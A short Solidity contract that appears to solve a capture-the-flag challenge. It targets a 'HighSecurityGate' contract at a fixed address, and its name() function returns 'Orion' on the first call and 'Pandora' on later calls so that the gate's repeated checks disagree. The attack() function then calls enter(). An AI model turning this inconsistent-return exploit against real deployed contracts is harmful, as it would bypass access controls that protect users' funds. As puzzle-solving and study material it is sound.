pragma solidity ^0.8.18;

import "./FortifiedPerimeter.sol";

contract Test is Entrant {   
    HighSecurityGate test = 
        HighSecurityGate(0x6804d8B689Aedc493eeA23b17f2Bf44ed0d3A8b9);
    int count;

    function name() external returns (string memory) {
        if (count == 0) {
            count++;
            return "Orion";
        }
        else {
            return "Pandora";            
        }
    }

    function attack() external returns (string memory) {
        count = 0;
        test.enter();
        string memory res = test.lastEntrant();
        return res;
    }
}

